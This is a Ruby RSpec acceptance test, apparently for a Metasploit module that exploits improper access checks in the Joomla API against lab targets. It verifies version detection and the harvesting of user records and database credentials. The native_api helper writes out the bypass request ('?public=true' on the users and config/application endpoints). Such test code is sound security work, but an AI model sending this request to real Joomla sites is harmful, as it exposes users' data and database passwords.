require 'acceptance_spec_helper'
require 'rbconfig'
require 'net/http'

RSpec.describe 'Native Joomla API access targets' do
  include_context 'module target'

  definitions = JSON.parse(File.read('test/module_targets/joomla_api/profiles.json'))
  profiles = definitions.fetch('profiles')
  module_name = 'auxiliary/scanner/http/joomla_api_improper_access_checks'

  before(:all) do
    argv = [RbConfig.ruby, 'test/module_targets/joomla_api/native_probe.rb']
    stdout, stderr, status = Open3.capture3(*argv)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-joomla.json'), stdout)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-joomla-status.json'), JSON.pretty_generate(argv: argv, stderr: stderr, exitstatus: status.exitstatus))
    expect(status.success?).to be(true), stderr
    @native = JSON.parse(stdout).fetch('profiles')
  end

  profiles.each do |service, profile|
    it "checks the genuine #{service} release and metadata policy" do
      output = run_target_module(module_name, service, options(service), action: 'check', allow_errors: true)
      if !profile.fetch('version_visible')
        expect(output).to include('Cannot reliably check exploitability.', 'Unable to determine Joomla Version')
      elsif profile.fetch('vulnerable')
        expect(output).to include("Joomla version #{profile.fetch('version')} is vulnerable", 'The target appears to be vulnerable.')
      else
        expect(output).to include("Joomla version #{profile.fetch('version')} is NOT vulnerable", 'The target is not exploitable.')
      end
    end
  end

  it 'does not identify unrelated Apache as Joomla' do
    output = run_target_module(module_name, 'unrelated', options('unrelated'), action: 'check', allow_errors: true)
    expect(output).to include('Cannot reliably check exploitability.', 'not detected as Joomla')
    expect(output).not_to include('The target appears to be vulnerable.')
  end

  profiles.select { |_service, profile| profile.fetch('vulnerable') }.each_key do |service|
    it "collects the actual #{service} users and database configuration twice" do
      paths = []
      2.times do
        output = run_target_module(module_name, service, options(service))
        output = output.dup.force_encoding(Encoding::UTF_8)
        expect(output.valid_encoding?).to be(true)
        paths.concat(verify_loot(service, output))
        @native.fetch(service).fetch('native_after').fetch('users').each do |user|
          expect(output).to include(user.fetch('name'), user.fetch('username'), user.fetch('email'))
        end
        native_config = @native.fetch(service).fetch('native_after').fetch('configuration')
        expect(output).to include('Joomla Users', 'Joomla Config', native_config.fetch('host'), native_config.fetch('user'), native_config.fetch('password'), native_config.fetch('db'))
      end
      expect(paths.uniq.size).to eq(4)
    end
  end

  %w[fixed unrelated].each do |service|
    it "does not invent loot when #{service} rejects the API request" do
      output = run_target_module(module_name, service, options(service), allow_errors: true)
      expect(output).to include("response code: #{service == 'fixed' ? 401 : 404}")
      expect(output).not_to include('Users JSON saved to', 'Config JSON saved to', 'Joomla Users', 'Joomla Config')
    end
  end

  %w[users config].each do |plugin|
    it "handles the genuine disabled #{plugin} webservice and recovers after native restoration" do
      target_exec('vulnerable', 'php', '/opt/module-target/inspect.php', plugin, '0')
      path = plugin == 'users' ? 'users' : 'config/application'
      expect(native_api(path).code).to eq('404')
      output = run_target_module(module_name, 'vulnerable', options('vulnerable'), allow_errors: true)
      expect(output).to include('response code: 404')
      expect(output).not_to include('Config JSON saved to')
      if plugin == 'users'
        expect(output).not_to include('Users JSON saved to')
      else
        verify_one_loot('vulnerable', output, 'Users', 'users')
      end
      target_exec('vulnerable', 'php', '/opt/module-target/inspect.php', plugin, '1')
      expect(native_api(path).code).to eq('200')
      output = run_target_module(module_name, 'vulnerable', options('vulnerable'))
      verify_loot('vulnerable', output)
    ensure
      target_exec('vulnerable', 'php', '/opt/module-target/inspect.php', plugin, '1')
    end
  end

  def options(service)
    definitions = JSON.parse(File.read('test/module_targets/joomla_api/profiles.json'))
    prefix = definitions.fetch('profiles').fetch(service, {}).fetch('prefix', '')
    { 'TARGETURI' => "#{prefix}/", 'VHOST' => definitions.fetch('vhost'), 'SSL' => false, 'THREADS' => 1 }
  end

  def verify_loot(service, output)
    [verify_one_loot(service, output, 'Users', 'users'), verify_one_loot(service, output, 'Config', 'config/application')]
  end

  def verify_one_loot(service, output, label, endpoint)
    path = output[/#{label} JSON saved to (.+)$/, 1]&.strip
    expect(path).not_to be_nil, output
    expect(File.expand_path(path)).to start_with(File.join(ENV.fetch('MSF_CFGROOT_CONFIG'), 'loot/'))
    expect(File.binread(path)).to eq(@native.fetch(service).fetch('bypass').fetch(endpoint).fetch('body'))
    path
  end

  def native_api(path)
    endpoint = target_endpoint('vulnerable')
    request = Net::HTTP::Get.new("/api/index.php/v1/#{path}?public=true")
    request['Host'] = JSON.parse(File.read('test/module_targets/joomla_api/profiles.json')).fetch('vhost')
    request['Accept'] = '*/*'
    Net::HTTP.start(endpoint.fetch('host'), endpoint.fetch('port'), nil, open_timeout: 5, read_timeout: 10) { |http| http.request(request) }
  end
end
